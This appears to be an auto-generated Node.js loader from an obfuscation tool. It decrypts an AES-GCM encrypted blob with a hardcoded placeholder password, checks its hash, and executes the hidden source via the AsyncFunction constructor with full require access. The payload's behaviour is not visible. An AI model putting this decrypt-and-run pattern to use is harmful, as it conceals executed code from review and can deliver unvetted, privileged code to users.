// ╔══════════════════════════════════════════════════════╗
// ║  Obfuscationary by JusticeTech                      ║
// ║  Version  : 3.0.0                                     ║
// ║  Encrypted: 2026-03-19 08:25:57 UTC                   ║
// ║  Cipher   : AES-256-GCM                               ║
// ║  Tamper   : Protected via SHA-256 integrity check    ║
// ╚══════════════════════════════════════════════════════╝

// Encrypted by Obfuscationary by JusticeTech v3.0.0
(async () => {
  if (typeof require === 'undefined') {
    throw new Error('[Obfuscationary] Browser mode not supported for multi-layer. Use Node.js.');
  }

  const _b64            = '07kKDPaxgqVkUU2Vk3UJ0YA53UZsnF+j11SOJ86x+Cwp6rVWwDEFxsbLlXh1WwRSjpA8jqxBFJhPA8w16IcNAkWN+V0bT/7ECeqdqNcGJfMIWhqjsDEu8xfyzyM0qOQEZGd1++pNFfKYA/rwXQ1iOeOHSkmydxjiFYfwP2LGvKYidJ9aYckesqZicaNKK1+xRwL1bTWPbVgaVWoWjwSjdoxVALK66Y+08nN0ZZydOjRjh0a40nHWZ+Bd7/k1AsD8sh+4FrIszArpC1AUiIfHWyohUUCrMJiZ7S2R2zjoVDShxhqmtZdyN0Os9JFLxZqs2t2Yb1gMoCic3Xh6PzA5at6zWLW1lGAyVO2M7VFbBrlUEhh6zNg2ntXedVnN2qQ8HO1/tFe3/X0Og2AkQ6hbnbvn4Z6o5ciPjBW8axlS9MQZELH81C7E7nhq4cldqH5zMdt2Rlw+hPR2hV/kURT51ZMwChWzJ18ssenBC2l2f8f0r8pSluaib6PIJZ82FcolW4N3JYtwUPpBTRp1sWSLZqRQ+GQg8uSc5Ix91XS0+2YfJEerae6mliDTFnuCA62TdpsQf4xweNSOZ1VS5GPYWVSc5Lt0Tml+PgXXKxO+hKSYIr0Ds4VHD6pg1DQzfpbyudLJxQ40SRGdnpw7t9/z+687PdRq//atmWGghvuQz1XpsmUQJHgjpI6L44Zw93/NKhlYAjY03QorkEKb6TgrH0IlczfWLNhqTslKFHQZMfuOWYzPI38g7sK7REORpXd5V3fuQEDKRIEWbg7ClAZ8VfBDcmNknSCi72DH7uM2ne0J+xg2UIu0MG5WA51ZriqFZI3ODWVmnUS1sRcdkR1ciFOcVqUTkxKEOeSbr3fnrWGucmcrR8EoK+i9mwML8+Gacf5mHd4WMBy7FqC2UtI3ll0mHUwTimFbYz7OKLYbOyllBEddLuOomC3yIu3iG+pbgLCw4z5kzMlDGrbPYaGmQMxLSKiSZs78wXtfOHPyTkGeB7g9RWawN4n3k9U0Z1YtAGGL6RVMhBXwKya1hkKsjS1m4/Od/ocMmdlFNvI3M2psUyZmklyxe/kftJihtdFZpyTIB9KaG/C9HMeWONa/54qHA4elHEyve+gTvNtGW3rtBjV4PgPhO9gy7DE3OWlKBh7mKAO76SIf7AXf10gA66GL7FY9XEA/bn+gEjXhwa+isKtQUJ5DRFDOi4+fJR0jwXQBfmcTsjOaCTIKusdAICO2N/2OQe/PswCaXswSnqcwpNYs7iSv4Ttg+UVCeVb+qXuz5s5dCbMcSIGTzL8vCVDRiHM7BmkZp+HgEpTf8H+CVZSs8+RLE+NOtEQgwfNJSjt9y4ORh1a8EhyJwhLHqqRqe9vXBWXhf+WL9nMbX3kjGGSDlfJkKT7sH3zx';
  const _INTEGRITY_HASH = '6ec3d7a96a20ebbd5934e7f40cef44e05d4b3186f58488ca3d5f80109fd811fe';
  let   _src;

  const _PWDS  = ["change_me_to_a_strong_password"];
  const _ITERS = 600000;

  // Integrity check
  const _crypto2 = require('crypto');
  const _actualHash = _crypto2.createHash('sha256').update(_b64).digest('hex');
  if (_actualHash !== _INTEGRITY_HASH) {
    throw new Error('[Obfuscationary] Tamper detected! File integrity check failed.');
  }

  // Multi-layer decrypt (reverse order)
  let _data = Buffer.from(_b64, 'base64');
  for (let _i = _PWDS.length - 1; _i >= 0; _i--) {
    const _pw   = _PWDS[_i];
    const _salt = _data.slice(0, 16);
    const _iv2  = _data.slice(16, 28);
    const _ct2  = _data.slice(28);
    const _ctag2 = _ct2.slice(_ct2.length - 16);
    const _cdat2 = _ct2.slice(0, _ct2.length - 16);
    const _key2  = _crypto2.pbkdf2Sync(_pw, _salt, _ITERS, 32, 'sha256');
    const _dec2  = _crypto2.createDecipheriv('aes-256-gcm', _key2, _iv2);
    _dec2.setAuthTag(_ctag2);
    _data = Buffer.concat([_dec2.update(_cdat2), _dec2.final()]);
  }
  _src = _data.toString('utf8');

  const _Fn = Object.getPrototypeOf(async function(){}).constructor;
  await _Fn('module', 'exports', 'require', '__filename', '__dirname', _src)(
    module, exports, require, __filename, __dirname
  );
})();
